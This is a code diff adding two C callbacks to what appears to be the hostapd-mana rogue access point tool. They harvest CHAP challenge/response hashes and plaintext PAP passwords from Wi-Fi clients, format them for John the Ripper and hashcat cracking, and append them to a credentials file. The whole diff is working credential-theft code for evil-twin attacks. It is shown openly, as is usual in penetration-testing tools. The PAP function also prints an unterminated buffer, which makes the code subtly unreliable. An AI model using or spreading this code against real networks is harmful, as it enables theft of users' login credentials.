@@ -2078,4 +2078,63 @@ void eap_server_mschap_rx_callback(struct eap_sm *sm, const char *source,
 		}
 	}
 }
+
+void eap_server_chap_rx_callback(struct eap_sm *sm, const char *source,
+				 const u8 *username, size_t username_len,
+				 const u8 *hash, const u8 *salt,
+				 u8 id)
+{
+	if (mana.conf->mana_wpe) {
+		char hex_hash[40], hex_salt[40], hex_id[10], user[100];
+
+		/* Print out Challenge and Response in format supported by asleap/jtr/hashcat. */
+		if (username)
+			printf_encode(user, sizeof(user), username, username_len);
+		else
+			user[0] = '\0';
+		wpa_snprintf_hex(hex_hash, 34, hash, 16);
+		wpa_snprintf_hex(hex_salt, 34, salt, 16);
+		wpa_snprintf_hex(hex_id, 3, &id, 1);
+		wpa_printf(MSG_INFO, "[MANA %s JTR user=%s] $chap$%s*%s*%s",
+			   source, user, hex_id, hex_salt, hex_hash);
+		wpa_printf(MSG_INFO, "[MANA %s HASHCAT user=%s] %s:%s:%s",
+			   source, user, hex_hash, hex_salt, hex_id);
+
+		if (os_strcmp("NOT_SET",mana.conf->mana_credout)!=0) {
+			FILE *f = fopen(mana.conf->mana_credout, "a");
+			if (f != NULL) {
+				fprintf(f,"[%s JTR user=%s]\t$chap$%s*%s*%s\n",
+					source, user, hex_id, hex_salt, hex_hash);
+				fprintf(f, "[%s HASHCAT user=%s]\t%s:%s:%s\n",
+					source, user, hex_hash, hex_salt, hex_id);
+				fclose(f);
+			}
+		}
+	}
+}
+
+void eap_server_pap_rx_callback(struct eap_sm *sm, const char *source,
+				 const u8 *username, size_t username_len,
+				 const u8 *password, size_t password_len)
+{
+	if (mana.conf->mana_wpe) {
+		char passwd[password_len+1], user[100];
+
+		if (username)
+			printf_encode(user, sizeof(user), username, username_len);
+		else
+			user[0] = '\0';
+		os_memcpy(passwd,password,password_len);
+		wpa_printf(MSG_INFO, "[MANA %s] %s:%s",
+			   source, user, password);
+
+		if (os_strcmp("NOT_SET",mana.conf->mana_credout)!=0) {
+			FILE *f = fopen(mana.conf->mana_credout, "a");
+			if (f != NULL) {
+				fprintf(f,"[%s]\t%s:%s\n", source, user, password);
+				fclose(f);
+			}
+		}
+	}
+}
 //MANA WPE END
